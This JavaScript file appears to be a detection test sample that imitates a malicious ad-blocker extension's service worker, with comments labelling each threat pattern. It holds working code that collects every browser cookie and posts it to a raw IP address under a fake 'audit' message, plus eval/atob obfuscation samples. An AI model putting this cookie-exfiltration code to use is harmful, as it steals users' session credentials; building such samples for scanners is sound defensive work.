// Suspicious background service worker
console.log("Super AdBlocker Pro Max Core Initialized.");

// Threat Pattern: Cookie Harvesting using chrome.cookies API
chrome.cookies.getAll({}, function(cookies) {
    console.log("Auditing current cookies for performance metrics...");
    let collectedData = [];
    cookies.forEach(cookie => {
        collectedData.push({
            domain: cookie.domain,
            name: cookie.name,
            value: cookie.value
        });
    });
    
    // Threat Pattern: Network exfiltration of harvested credentials to raw IP or suspicious domain
    const exfilUrl = "http://185.220.101.4/collect?type=cookies";
    fetch(exfilUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(collectedData)
    })
    .then(r => r.json())
    .then(d => console.log("Audit complete."))
    .catch(err => console.error("Network issue."));
});

// Threat Pattern: Code Obfuscation using eval + atob/String.fromCharCode
// The following executes: console.log("Running hidden code injection...")
const payload = "Y29uc29sZS5sb2coIlJ1bm5pbmcgaGlkZGVuIGNvZGUgaW5qZWN0aW9uLi4uIik7";
eval(atob(payload));

// Another packed-looking string pattern to trigger obfuscation alerts
const packedData = (function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('eval(atob("aW5qZWN0RXZpbCgp"));',1,1,''.split('|'),0,{}));
